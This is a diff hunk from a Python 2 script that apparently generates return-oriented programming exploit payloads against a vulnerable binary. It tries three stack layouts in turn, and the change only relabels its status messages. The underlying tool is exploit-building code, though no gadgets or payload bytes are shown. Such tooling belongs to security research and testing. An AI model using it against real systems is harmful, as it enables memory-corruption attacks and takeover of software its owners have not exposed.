@@ -1060,31 +1060,31 @@ if __name__ == '__main__':
     rop_payload = ""
 
     print '===============================================================\n'
-    print 'Attempting to find ROP payload with generic stack frame layout ...'
+    print 'Attempting to find ROP payload with stack layout 1 ...'
     buffer_address = find_buffer_addr(vuln_bin, 416)
     rop_payload, result = build_rop_chain_syscall_generic(lib_list, buffer_address + 128)
     if result == True:
-        print 'Successfully built ROP payload with generic stack frame layout'
+        print 'Successfully built ROP payload with stack layout 1'
         print '===============================================================\n'
     
     if result == False:
-        print 'Unable to build ROP payload with generic stack frame layout !'
+        print 'Unable to build ROP payload with stack layout 1 !'
         print '===============================================================\n'
-        print 'Attempting to find ROP payload with syscall stack frame layout ...'
+        print 'Attempting to find ROP payload with stack layout 2 ...'
         buffer_address = find_buffer_addr(vuln_bin, 444)
         rop_payload, result = build_rop_chain_libc_syscalls(lib_list, buffer_address + 128)
         if result == True:
-            print 'Successfully built ROP payload with syscall stack frame layout'
+            print 'Successfully built ROP payload with stack layout 2'
             print '===============================================================\n'
 
     if result == False:
-        print 'Unable to build ROP payload with syscall stack frame layout !'
+        print 'Unable to build ROP payload with stack layout 2 !'
         print '===============================================================\n'
-        print 'Attempting to find ROP payload with libc stack frame layout ...'
+        print 'Attempting to find ROP payload with stack layout 3 ...'
         buffer_address = find_buffer_addr(vuln_bin, 392)
         rop_payload, result = build_rop_chain_libc(lib_list, buffer_address, libc_path, libc_base_address)
         if result == True:
-            print 'Successfully built ROP payload with libc stack frame layout'
+            print 'Successfully built ROP payload with stack layout 3'
             print '===============================================================\n'
 
 
